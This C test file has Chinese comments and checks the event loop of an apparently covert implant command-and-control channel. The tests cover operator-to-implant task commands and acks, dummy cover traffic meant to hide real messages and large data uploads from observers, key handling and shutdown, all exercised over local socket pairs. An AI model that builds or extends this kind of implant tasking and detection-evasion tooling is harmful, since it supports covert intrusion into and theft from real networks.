/* test_cover_loop.c — 任务通道的真实事件循环：双向覆盖 + 命令派发 */
#include "cover_loop.h"
#include "exfil_task.h"
#include "exfil_task_link.h"
#include "exfil_task_cover.h"
#include "p2p_cell.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>

static int pass = 0, fail = 0;

#define CHECK(cond, msg) do { \
    if (cond) { printf("[PASS] %s\n", msg); pass++; } \
    else      { printf("[FAIL] %s\n", msg); fail++; } \
} while (0)

/* 方向密钥：服务端 ks=KA kr=KB；植入体 ks=KB kr=KA */
static const uint8_t KA[16] = {0xA0,1,2,3,4,5,6,7,8,9,0xA,0xB,0xC,0xD,0xE,0xF};
static const uint8_t KB[16] = {0xB0,1,2,3,4,5,6,7,8,9,0xA,0xB,0xC,0xD,0xE,0xF};
static const uint8_t PFX[8] = {0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08};

/* 虚拟时钟（供 step 的 now_ms 注入） */
static uint32_t g_now = 0;

/* 真实单调时钟（供 run 使用，测试只跑约 1 秒） */
static uint32_t real_clock(void *ud) {
    struct timespec ts;
    (void)ud;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint32_t)(ts.tv_sec * 1000u + ts.tv_nsec / 1000000u);
}

/* ---- 回调计数 ---- */
typedef struct {
    int n_cmd;
    int n_ack;
    uint64_t last_cmd_seq;
    uint64_t last_cmd_id;
    uint8_t  last_op;
    int stop_after;   /* >0：收到这么多条后请求停止 */
} cb_ctx_t;

static int on_cmd(void *ud, uint64_t seq, const exfil_task_cmd_t *c) {
    cb_ctx_t *k = (cb_ctx_t *)ud;
    k->n_cmd++;
    k->last_cmd_seq = seq;
    k->last_cmd_id  = c->task_id;
    k->last_op      = c->opcode;
    if (k->stop_after > 0 && k->n_cmd >= k->stop_after) return 1;
    return 0;
}

static int on_ack(void *ud, uint64_t seq, const exfil_task_ack_t *a) {
    cb_ctx_t *k = (cb_ctx_t *)ud;
    (void)seq;
    k->n_ack++;
    k->last_cmd_id = a->task_id;
    k->last_op     = a->opcode;
    if (k->stop_after > 0 && k->n_ack >= k->stop_after) return 1;
    return 0;
}


/*
 * 连续推进若干步（每步 +500ms 虚拟时间），直到 cond 成立或步数用尽。
 * step 一次只解一个入站信元，覆盖信元会排在真实消息前面，因此必须
 * 多步才能穿过覆盖流读到目标消息。
 */
static int pump_until(exfil_cover_loop_t *L, cb_ctx_t *k, int max_steps,
                      int want_cmd)
{
    for (int i = 0; i < max_steps; i++) {
        g_now += 500;
        if (exfil_cover_loop_step(L, g_now, 0, on_cmd, on_ack, k, NULL)
            != EXF_LOOP_OK)
            return 0;
        if (want_cmd ? (k->n_cmd > 0) : (k->n_ack > 0)) return 1;
    }
    return 0;
}

/* ---------- 用例1：参数校验 ---------- */
static void test_arg(void) {
    exfil_task_chan_t ch;
    exfil_cover_loop_t L;

    CHECK(exfil_cover_loop_init(NULL, &ch, EXF_LOOP_IMPLANT, 0,
                                P2P_COVER_PROFILE_DIRECT, 60000, 0, 0)
          == EXF_LOOP_ERR_ARG, "init 空指针被拒");

    exfil_task_chan_init(&ch, KA, KB, PFX);

    CHECK(exfil_cover_loop_init(&L, &ch, EXF_LOOP_IMPLANT, -1,
                                P2P_COVER_PROFILE_DIRECT, 60000, 0, 0)
          == EXF_LOOP_ERR_ARG, "init 非法 fd 被拒");

    CHECK(exfil_cover_loop_init(&L, NULL, EXF_LOOP_IMPLANT, 3,
                                P2P_COVER_PROFILE_DIRECT, 60000, 0, 0)
          == EXF_LOOP_ERR_ARG, "init 空 chan 被拒");

    CHECK(exfil_cover_loop_init(&L, &ch, (exfil_loop_side_t)99, 3,
                                P2P_COVER_PROFILE_DIRECT, 60000, 0, 0)
          == EXF_LOOP_ERR_ARG, "init 非法 side 被拒");

    CHECK(exfil_cover_loop_init(&L, &ch, EXF_LOOP_IMPLANT, 3,
                                P2P_COVER_PROFILE_DIRECT, 60000, 0, 0)
          == EXF_LOOP_OK, "init 正常成功");
    CHECK(L.period_ms == EXF_TASK_COVER_PERIOD_MS, "period_ms 为 0 取默认 500");

    /* 未 init 的循环不得被 step/run */
    exfil_cover_loop_t Z;
    memset(&Z, 0, sizeof Z);
    CHECK(exfil_cover_loop_step(&Z, 0, 0, NULL, NULL, NULL, NULL)
          == EXF_LOOP_ERR_ARG, "未 init 的 step 被拒");
    CHECK(exfil_cover_loop_run(&Z, real_clock, NULL, NULL, NULL, NULL, 10)
          == EXF_LOOP_ERR_ARG, "未 init 的 run 被拒");
    CHECK(exfil_cover_loop_run(&L, NULL, NULL, NULL, NULL, NULL, 10)
          == EXF_LOOP_ERR_ARG, "run 空时钟被拒");

    exfil_cover_loop_wipe(&L);
    exfil_task_chan_wipe(&ch);
}

/* ---------- 用例2：空闲期双向覆盖（核心） ---------- */
static void test_idle_both_directions(void) {
    int sp[2];
    exfil_task_chan_t srv, imp;
    exfil_cover_loop_t ls, li;
    cb_ctx_t cs, ci;

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sp) != 0) { CHECK(0, "socketpair"); return; }

    exfil_task_chan_init(&srv, KA, KB, PFX);
    exfil_task_chan_init(&imp, KB, KA, PFX);

    g_now = 0;
    CHECK(exfil_cover_loop_init(&ls, &srv, EXF_LOOP_OPERATOR, sp[0],
                                P2P_COVER_PROFILE_DIRECT, 60000, 500, g_now)
          == EXF_LOOP_OK, "服务端循环 init 成功");
    CHECK(exfil_cover_loop_init(&li, &imp, EXF_LOOP_IMPLANT, sp[1],
                                P2P_COVER_PROFILE_DIRECT, 60000, 500, g_now)
          == EXF_LOOP_OK, "植入体循环 init 成功");

    memset(&cs, 0, sizeof cs);
    memset(&ci, 0, sizeof ci);

    /* 20 轮 × 500ms = 10 秒虚拟空闲，两端交替 step（互相排空） */
    for (int i = 0; i < 20; i++) {
        g_now += 500;
        if (exfil_cover_loop_step(&ls, g_now, 0, on_cmd, on_ack, &cs, NULL)
            != EXF_LOOP_OK) break;
        if (exfil_cover_loop_step(&li, g_now, 0, on_cmd, on_ack, &ci, NULL)
            != EXF_LOOP_OK) break;
    }

    CHECK(ls.cover_sent > 0, "空闲期服务端（下行）确实发出了覆盖");
    CHECK(li.cover_sent > 0, "空闲期植入体（上行）确实发出了覆盖");
    CHECK(li.pad_recv > 0, "植入体收到下行的覆盖并识别为 PAD");
    CHECK(ls.pad_recv > 0, "服务端收到上行的覆盖并识别为 PAD");

    /* 硬规则 3：PAD 绝不派发给回调 */
    CHECK(cs.n_cmd == 0 && cs.n_ack == 0, "服务端未把 PAD 派发为命令/回执");
    CHECK(ci.n_cmd == 0 && ci.n_ack == 0, "植入体未把 PAD 派发为命令/回执");
    CHECK(ls.msg_recv == 0 && li.msg_recv == 0, "双向均无真实消息（纯空闲）");

    close(sp[0]); close(sp[1]);
    exfil_cover_loop_wipe(&ls); exfil_cover_loop_wipe(&li);
    exfil_task_chan_wipe(&srv); exfil_task_chan_wipe(&imp);
}

/* ---------- 用例3：命令夹在覆盖流里仍能正确派发 ---------- */
static void test_cmd_amid_cover(void) {
    int sp[2];
    exfil_task_chan_t srv, imp;
    exfil_cover_loop_t ls, li;
    cb_ctx_t cs, ci;
    exfil_task_cmd_t c;
    exfil_task_ack_t a;
    int r;

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sp) != 0) { CHECK(0, "socketpair"); return; }

    exfil_task_chan_init(&srv, KA, KB, PFX);
    exfil_task_chan_init(&imp, KB, KA, PFX);

    g_now = 0;
    exfil_cover_loop_init(&ls, &srv, EXF_LOOP_OPERATOR, sp[0],
                          P2P_COVER_PROFILE_DIRECT, 60000, 500, g_now);
    exfil_cover_loop_init(&li, &imp, EXF_LOOP_IMPLANT, sp[1],
                          P2P_COVER_PROFILE_DIRECT, 60000, 500, g_now);
    memset(&cs, 0, sizeof cs);
    memset(&ci, 0, sizeof ci);

    /* 先铺 6 轮覆盖 */
    for (int i = 0; i < 6; i++) {
        g_now += 500;
        exfil_cover_loop_step(&ls, g_now, 0, on_cmd, on_ack, &cs, NULL);
        exfil_cover_loop_step(&li, g_now, 0, on_cmd, on_ack, &ci, NULL);
    }
    uint64_t srv_cov_before = ls.cover_sent;

    /* 下发一条命令（循环外发送，须回注 note_data） */
    memset(&c, 0, sizeof c);
    c.opcode  = EXF_TASK_OP_START;
    c.task_id = 4242;
    r = exfil_task_chan_cmd(&srv, sp[0], 1, &c);
    CHECK(r == EXF_TASK_OK, "服务端下发命令成功");
    exfil_cover_loop_note_data(&ls, 1, g_now);

    /* 植入体推进：命令排在覆盖流之后，需多步穿过覆盖才能读到 */
    CHECK(pump_until(&li, &ci, 12, 1) == 1, "植入体在覆盖流中读到命令");
    CHECK(ci.n_cmd == 1, "命令在覆盖流中被正确派发（恰好 1 条）");
    CHECK(ci.last_cmd_id == 4242, "命令 task_id 一致");
    CHECK(ci.last_cmd_seq == 1, "命令 seq 一致（覆盖未污染序号空间）");
    CHECK(ci.last_op == EXF_TASK_OP_START, "命令 opcode 一致");

    /* 植入体回执（循环外发送，同样回注） */
    memset(&a, 0, sizeof a);
    a.opcode  = EXF_TASK_OP_START;
    a.status  = EXF_TASK_ST_OK;
    a.task_id = 4242;
    a.mode    = EXF_SCHED_MODE_CONTINUOUS;
    r = exfil_task_chan_ack(&imp, sp[1], 1, &a);
    CHECK(r == EXF_TASK_OK, "植入体回执成功");
    exfil_cover_loop_note_data(&li, 1, g_now);

    CHECK(pump_until(&ls, &cs, 12, 0) == 1, "服务端在覆盖流中读到回执");
    CHECK(cs.n_ack == 1, "回执在覆盖流中被正确派发（恰好 1 条）");
    CHECK(cs.last_cmd_id == 4242, "回执 task_id 一致");

    /* 覆盖在命令之后仍在继续 */
    for (int i = 0; i < 4; i++) {
        g_now += 500;
        exfil_cover_loop_step(&ls, g_now, 0, on_cmd, on_ack, &cs, NULL);
        exfil_cover_loop_step(&li, g_now, 0, on_cmd, on_ack, &ci, NULL);
    }
    CHECK(ls.cover_sent > srv_cov_before, "命令之后覆盖仍在继续（无观测凹陷）");

    close(sp[0]); close(sp[1]);
    exfil_cover_loop_wipe(&ls); exfil_cover_loop_wipe(&li);
    exfil_task_chan_wipe(&srv); exfil_task_chan_wipe(&imp);
}

/* ---------- 用例4：预算为 0 = 明确禁用，保持静默 ---------- */
static void test_budget_zero_silent(void) {
    int sp[2];
    exfil_task_chan_t srv, imp;
    exfil_cover_loop_t ls, li;
    cb_ctx_t cs, ci;

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sp) != 0) { CHECK(0, "socketpair"); return; }

    exfil_task_chan_init(&srv, KA, KB, PFX);
    exfil_task_chan_init(&imp, KB, KA, PFX);

    g_now = 0;
    exfil_cover_loop_init(&ls, &srv, EXF_LOOP_OPERATOR, sp[0],
                          P2P_COVER_PROFILE_DIRECT, 0, 500, g_now);
    exfil_cover_loop_init(&li, &imp, EXF_LOOP_IMPLANT, sp[1],
                          P2P_COVER_PROFILE_DIRECT, 0, 500, g_now);
    memset(&cs, 0, sizeof cs);
    memset(&ci, 0, sizeof ci);

    for (int i = 0; i < 20; i++) {
        g_now += 500;
        if (exfil_cover_loop_step(&ls, g_now, 0, on_cmd, on_ack, &cs, NULL)
            != EXF_LOOP_OK) break;
        if (exfil_cover_loop_step(&li, g_now, 0, on_cmd, on_ack, &ci, NULL)
            != EXF_LOOP_OK) break;
    }

    CHECK(ls.cover_sent == 0 && li.cover_sent == 0, "预算 0 => 两端均不产生覆盖");
    CHECK(ls.pad_recv == 0 && li.pad_recv == 0, "预算 0 => 链路上无 PAD");

    close(sp[0]); close(sp[1]);
    exfil_cover_loop_wipe(&ls); exfil_cover_loop_wipe(&li);
    exfil_task_chan_wipe(&srv); exfil_task_chan_wipe(&imp);
}

/* ---------- 用例5：对端关闭 => CLOSED（与写失败区分） ---------- */
static void test_peer_closed(void) {
    int sp[2];
    exfil_task_chan_t imp;
    exfil_cover_loop_t li;
    cb_ctx_t ci;

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sp) != 0) { CHECK(0, "socketpair"); return; }

    exfil_task_chan_init(&imp, KB, KA, PFX);
    g_now = 0;
    exfil_cover_loop_init(&li, &imp, EXF_LOOP_IMPLANT, sp[1],
                          P2P_COVER_PROFILE_DIRECT, 60000, 500, g_now);
    memset(&ci, 0, sizeof ci);

    close(sp[0]);   /* 对端 orderly 关闭 */

    g_now += 500;
    int r = exfil_cover_loop_step(&li, g_now, 0, on_cmd, on_ack, &ci, NULL);
    CHECK(r == EXF_LOOP_ERR_CLOSED, "对端关闭返回 EXF_LOOP_ERR_CLOSED（非 IO 混同）");

    close(sp[1]);
    exfil_cover_loop_wipe(&li);
    exfil_task_chan_wipe(&imp);
}

/* ---------- 用例6：run 长跑（真实时钟）+ stop 生效 ---------- */
static void test_run_and_stop(void) {
    int sp[2];
    exfil_task_chan_t srv, imp;
    exfil_cover_loop_t ls, li;
    cb_ctx_t cs, ci;

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sp) != 0) { CHECK(0, "socketpair"); return; }

    exfil_task_chan_init(&srv, KA, KB, PFX);
    exfil_task_chan_init(&imp, KB, KA, PFX);

    /* 周期取 100ms 让测试在 ~1 秒内完成；预算给足以保证有覆盖发出 */
    exfil_cover_loop_init(&ls, &srv, EXF_LOOP_OPERATOR, sp[0],
                          P2P_COVER_PROFILE_DIRECT, 600000, 100, 0);
    exfil_cover_loop_init(&li, &imp, EXF_LOOP_IMPLANT, sp[1],
                          P2P_COVER_PROFILE_DIRECT, 600000, 100, 0);
    memset(&cs, 0, sizeof cs);
    memset(&ci, 0, sizeof ci);
    ci.stop_after = 1;

    /*
     * 单进程内无法同时 run 两个循环（会互相等），故：
     *   服务端跑 run（自己发覆盖），植入体在 run 之外用 step 排空。
     * 这里让服务端 run 600ms 后由其自身超时退出。
     */
    int r = exfil_cover_loop_run(&ls, real_clock, NULL, on_cmd, on_ack, &cs, 600);
    CHECK(r == EXF_LOOP_OK, "run 正常超时退出（无错误）");
    CHECK(ls.cover_sent > 0, "run 在空闲期确实发出了覆盖（硬规则 1）");
    CHECK(ls.ticks > 1, "run 迭代多次而非一次跑完");

    /* stop 生效：回调请求停止后 run 返回 STOP */
    cs.stop_after = 0;
    li.stop = 0; ci.n_cmd = 0;
    exfil_cover_loop_stop(&li);
    CHECK(li.stop == 1, "stop 标志被置位");
    r = exfil_cover_loop_run(&li, real_clock, NULL, on_cmd, on_ack, &ci, 0);
    CHECK(r == EXF_LOOP_OK, "已 stop 的 run 立即返回 OK");

    close(sp[0]); close(sp[1]);
    exfil_cover_loop_wipe(&ls); exfil_cover_loop_wipe(&li);
    exfil_task_chan_wipe(&srv); exfil_task_chan_wipe(&imp);
}

/* ---------- 用例7：自适应 —— 数据突发后覆盖让位 ---------- */
static void test_cover_adaptive(void) {
    int sp[2];
    exfil_task_chan_t srv, imp;
    exfil_cover_loop_t ls, li;
    cb_ctx_t cs, ci;
    uint32_t rate_idle;
    int i;

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sp) != 0) { CHECK(0, "socketpair"); return; }

    exfil_task_chan_init(&srv, KA, KB, PFX);
    exfil_task_chan_init(&imp, KB, KA, PFX);

    g_now = 0;
    exfil_cover_loop_init(&ls, &srv, EXF_LOOP_OPERATOR, sp[0],
                          P2P_COVER_PROFILE_DIRECT, 60000, 500, g_now);
    exfil_cover_loop_init(&li, &imp, EXF_LOOP_IMPLANT, sp[1],
                          P2P_COVER_PROFILE_DIRECT, 60000, 500, g_now);
    memset(&cs, 0, sizeof cs);
    memset(&ci, 0, sizeof ci);

    for (i = 0; i < 4; i++) {
        g_now += 500;
        exfil_cover_loop_step(&ls, g_now, 0, on_cmd, on_ack, &cs, NULL);
        exfil_cover_loop_step(&li, g_now, 0, on_cmd, on_ack, &ci, NULL);
    }
    rate_idle = exfil_cover_loop_rate(&ls);
    CHECK(rate_idle > 0, "空闲覆盖速率 > 0");

    /* 回注一次大批数据（204 个信元，约一次大产物回传） */
    CHECK(exfil_cover_loop_note_data(&ls, 204, g_now) == EXF_LOOP_OK,
          "note_data 大批数据成功");
    CHECK(exfil_cover_loop_note_data(&ls, 0, g_now) == EXF_LOOP_OK,
          "note_data(0) 视作无效调用，不报错");

    /* 跨过 EWMA 窗口边界（60s）让 data_rate 生效 */
    for (i = 0; i < 130; i++) {
        g_now += 500;
        if (exfil_cover_loop_step(&ls, g_now, 0, on_cmd, on_ack, &cs, NULL)
            != EXF_LOOP_OK) break;
        if (exfil_cover_loop_step(&li, g_now, 0, on_cmd, on_ack, &ci, NULL)
            != EXF_LOOP_OK) break;
    }
    CHECK(i == 130, "130 轮推进中途无 IO 错误");

    printf("[INFO] 空闲覆盖速率=%u  数据突发后=%u\n",
           rate_idle, exfil_cover_loop_rate(&ls));
    CHECK(exfil_cover_loop_rate(&ls) <= rate_idle,
          "数据突发后覆盖速率不高于空闲值（覆盖让位，不超预算）");

    close(sp[0]); close(sp[1]);
    exfil_cover_loop_wipe(&ls); exfil_cover_loop_wipe(&li);
    exfil_task_chan_wipe(&srv); exfil_task_chan_wipe(&imp);
}

int main(void) {
    test_arg();
    test_idle_both_directions();
    test_cmd_amid_cover();
    test_budget_zero_silent();
    test_peer_closed();
    test_run_and_stop();
    test_cover_adaptive();
    printf("=== result: %d pass, %d fail ===\n", pass, fail);
    return fail ? 1 : 0;
}
